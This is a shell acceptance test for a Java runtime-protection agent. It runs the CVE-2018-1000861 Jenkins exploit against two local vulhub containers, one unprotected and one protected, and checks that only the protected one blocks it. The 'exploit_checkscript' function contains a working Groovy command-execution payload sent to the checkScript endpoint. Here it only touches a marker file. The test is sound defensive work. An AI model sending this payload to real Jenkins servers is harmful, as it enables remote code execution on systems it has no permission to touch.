#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_JENKINS_1000861_IMAGE:-vulhub/jenkins:2.138}"
baseline_name="${OHMYRASP_VULHUB_JENKINS_1000861_BASELINE_NAME:-ohmyrasp-vulhub-jenkins-1000861-baseline}"
protected_name="${OHMYRASP_VULHUB_JENKINS_1000861_PROTECTED_NAME:-ohmyrasp-vulhub-jenkins-1000861-protected}"
baseline_port="${OHMYRASP_VULHUB_JENKINS_1000861_BASELINE_PORT:-19142}"
protected_port="${OHMYRASP_VULHUB_JENKINS_1000861_PROTECTED_PORT:-19143}"
marker="${OHMYRASP_VULHUB_JENKINS_1000861_MARKER:-/tmp/ohmyrasp-jenkins-1000861-success}"
baseline_dir="logs/vulhub-jenkins-2018-1000861-java8-baseline"
protected_dir="logs/vulhub-jenkins-2018-1000861-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_jenkins() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 240); do
    status="$(
      curl --max-time 5 -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
        "http://127.0.0.1:${port}/" 2>/dev/null || true
    )"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "403" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Jenkins CVE-2018-1000861 did not become ready at ${port}" >&2
  exit 1
}

exploit_checkscript() {
  local port="$1"
  local output="$2"
  local payload
  payload="public class x { public x(){ \"touch ${marker}\".execute() } }"
  curl -sS -G -o "$output" -w "%{http_code}" \
    --data-urlencode "sandbox=true" \
    --data-urlencode "value=${payload}" \
    "http://127.0.0.1:${port}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript" \
    || true
}

expect_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 startup event for Jenkins CVE-2018-1000861" >&2
    exit 1
  fi
  if ! grep -q '"command_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 8 command hook startup marker for Jenkins CVE-2018-1000861" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Jenkins CVE-2018-1000861 produced a detection before the exploit request" >&2
    exit 1
  fi
}

wait_for_command_block() {
  for attempt in $(seq 1 30); do
    printf 'command_block_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
    if grep -Eq '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' \
      "$protected_log" 2>/dev/null; then
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_command_execution_exploit_primitive block event for Jenkins CVE-2018-1000861" >&2
  exit 1
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
rm -f "$protected_log"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --init --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for_jenkins "$baseline_name" "$baseline_port" "$baseline_dir"
baseline_status="$(exploit_checkscript "$baseline_port" "${baseline_dir}/checkscript.response")"
printf 'baseline_exploit_status=%s\n' "$baseline_status" >> "${baseline_dir}/attempts.log"
if [[ ! "$baseline_status" =~ ^2 ]]; then
  cat "${baseline_dir}/checkscript.response" >&2
  echo "Jenkins CVE-2018-1000861 baseline exploit returned ${baseline_status}" >&2
  exit 1
fi
if ! docker exec "$baseline_name" test -f "$marker"; then
  cat "${baseline_dir}/checkscript.response" >&2
  docker exec "$baseline_name" ls -la /tmp >&2 || true
  echo "Jenkins CVE-2018-1000861 baseline did not create ${marker}" >&2
  exit 1
fi

docker run -d --init --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for_jenkins "$protected_name" "$protected_port" "$protected_dir"
expect_startup_without_detection
protected_status="$(exploit_checkscript "$protected_port" "${protected_dir}/checkscript.response")"
printf 'protected_exploit_status=%s\n' "$protected_status" >> "${protected_dir}/attempts.log"
if [[ "$protected_status" =~ ^2 ]]; then
  cat "${protected_dir}/checkscript.response" >&2
  echo "Jenkins CVE-2018-1000861 protected exploit unexpectedly returned ${protected_status}" >&2
  exit 1
fi
wait_for_command_block
if docker exec "$protected_name" test -f "$marker"; then
  docker exec "$protected_name" ls -la "$marker" >&2 || true
  echo "Jenkins CVE-2018-1000861 protected marker was created despite block" >&2
  exit 1
fi

echo "vulhub Jenkins CVE-2018-1000861 Java8 acceptance passed"
